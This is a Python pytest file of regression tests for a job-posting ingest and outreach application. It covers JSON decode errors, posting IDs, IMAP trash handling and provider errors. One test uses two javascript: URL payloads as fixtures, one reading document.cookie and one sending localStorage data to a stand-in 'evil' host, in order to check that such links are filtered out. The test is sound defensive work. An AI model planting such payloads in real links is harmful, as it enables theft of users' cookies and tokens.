"""Regression tests for the CodeRabbit review of PR #8 (one test per finding that can run
without a database or a browser)."""
from datetime import datetime, timezone

import httpx
import pytest

from app.ingest.detect import detect
from app.ingest.http import SourceError, make_fetcher
from app.ingest.models import RawJob
from app.ingest.sources import greenhouse, smartrecruiters
from app.ratelimit import RateLimiter, UnlimitedBuckets
from tests.fakes.ats import FakeUniverse


def _fetcher(handler):
    return make_fetcher(httpx.MockTransport(handler), RateLimiter(UnlimitedBuckets()), sleep=lambda s: None)


# --- ingest ---------------------------------------------------------------------------
def test_html_body_with_200_is_a_source_error_not_a_crash():
    f = _fetcher(lambda r: httpx.Response(200, text="<html>Checking your browser...</html>"))
    with pytest.raises(SourceError, match="not JSON"):
        f.get_json("greenhouse", "https://boards-api.greenhouse.io/v1/boards/x/jobs")
    with pytest.raises(SourceError, match="not JSON"):
        f.post_json("workday", "https://x.wd5.myworkdayjobs.com/wday/cxs/x/y/jobs", {})


def test_posting_id_is_the_identity_for_direct_and_aggregator_urls():
    uni = FakeUniverse(seed=3)
    uni.add_company("Acme Corp", "greenhouse", "acme", n_jobs=2)
    uni.add_company("SR Co", "smartrecruiters", "srco", n_jobs=2)
    f = make_fetcher(uni.transport(), RateLimiter(UnlimitedBuckets()), sleep=lambda s: None)
    for j in greenhouse.fetch(f, "acme", "Acme") + smartrecruiters.fetch(f, "srco", "SR Co"):
        # the id an aggregator link to this posting carries is the same id the direct fetcher stores
        assert detect(j.url).req_id == j.req_id, j.url


def test_non_http_links_never_reach_the_database():
    from app.ingest.runner import normalize_all
    good = RawJob(source="jsonld", ats="jsonld", company="Acme", title="Software Engineer",
                  url="https://acme.example/jobs/1", apply_url="javascript:alert(document.cookie)",
                  description="Python", description_is_html=False)
    evil = RawJob(source="jsonld", ats="jsonld", company="Acme", title="Software Engineer II",
                  url="javascript:fetch('//evil/'+localStorage.jobbot)", description="Python",
                  description_is_html=False)
    out = normalize_all([good, evil], [], datetime.now(timezone.utc))
    assert [n.raw.url for n in out] == ["https://acme.example/jobs/1"]
    assert out[0].raw.apply_url is None


# --- outreach providers ---------------------------------------------------------------
@pytest.mark.parametrize("handler", [
    lambda r: (_ for _ in ()).throw(httpx.ConnectTimeout("timed out", request=r)),
    lambda r: httpx.Response(200, text="<html>maintenance</html>"),
    lambda r: httpx.Response(200, json=["not", "an", "object"]),
])
def test_provider_transport_and_decode_errors_become_provider_errors(handler):
    from app.outreach.providers import Apollo, Hunter, ProviderError
    t = httpx.MockTransport(handler)
    with pytest.raises(ProviderError):
        Apollo("k", transport=t).resolve_domain("Acme")
    with pytest.raises(ProviderError):
        Hunter("k", transport=t).resolve_domain("Acme")


# --- IMAP trash -----------------------------------------------------------------------
class FakeImap:
    def __init__(self, caps="IMAP4rev1", copy_ok=True, folders=None):
        self.caps, self.copy_ok, self.calls = caps, copy_ok, []
        self.capabilities = ("IMAP4REV1",)
        self.folders = folders or [b'(\\HasNoChildren \\Trash) "/" "Deleted Items"', b'(\\HasNoChildren) "/" "INBOX"']

    def capability(self):
        return "OK", [self.caps.encode()]

    def list(self):
        return "OK", self.folders

    def uid(self, cmd, *args):
        self.calls.append((cmd.lower(),) + args)
        if cmd.lower() == "copy" and not self.copy_ok:
            return "NO", [b"[TRYCREATE] no such mailbox"]
        return "OK", [b""]

    def expunge(self):
        self.calls.append(("expunge-all",))
        return "OK", [b""]


def _client(conn, **kw):
    from app.mail.imap_client import ImapClient
    c = ImapClient(username="u", password="p", **kw)
    c._conn = conn
    return c


def test_imap_trash_never_deletes_when_copy_fails():
    from app.mail.imap_client import ImapError
    conn = FakeImap(copy_ok=False)
    with pytest.raises(ImapError, match="left in place"):
        _client(conn).trash("42")
    assert [c[0] for c in conn.calls] == ["copy"]                  # no \Deleted flag, no expunge


def test_imap_trash_finds_special_use_folder_and_expunges_only_that_uid():
    conn = FakeImap(caps="IMAP4rev1 UIDPLUS")
    _client(conn).trash("42")
    assert conn.calls == [("copy", "42", '"Deleted Items"'), ("store", "42", "+FLAGS", "(\\Deleted)"),
                          ("expunge", "42")]


def test_imap_trash_without_uidplus_never_runs_a_global_expunge():
    conn = FakeImap()
    _client(conn, trash_folder="Trash").trash("42")
    assert ("expunge-all",) not in conn.calls and not any(c[0] == "expunge" for c in conn.calls)


def test_imap_trash_uses_move_when_available():
    conn = FakeImap(caps="IMAP4rev1 MOVE UIDPLUS")
    _client(conn).trash("42")
    assert conn.calls == [("move", "42", '"Deleted Items"')]


def test_imap_trash_folder_comes_from_credential_meta(monkeypatch):
    from app.mail import accounts
    monkeypatch.setattr(accounts, "load_credential",
                        lambda s, u, h: None if h == "gmail" else
                        ("me@fastmail.com", {"password": "x"}, {"imap_host": "imap.fastmail.com", "trash_folder": "Bin"}))
    c = accounts.mail_client(None, "u")
    assert c.trash_folder == "Bin" and c.imap_host == "imap.fastmail.com"


# --- adapters -------------------------------------------------------------------------
def test_generic_adapter_is_not_in_the_registry():
    from app.apply.adapters import get_adapter, names
    assert "generic" not in names()
    assert get_adapter("generic", "https://careers.example.com/jobs/1") is None
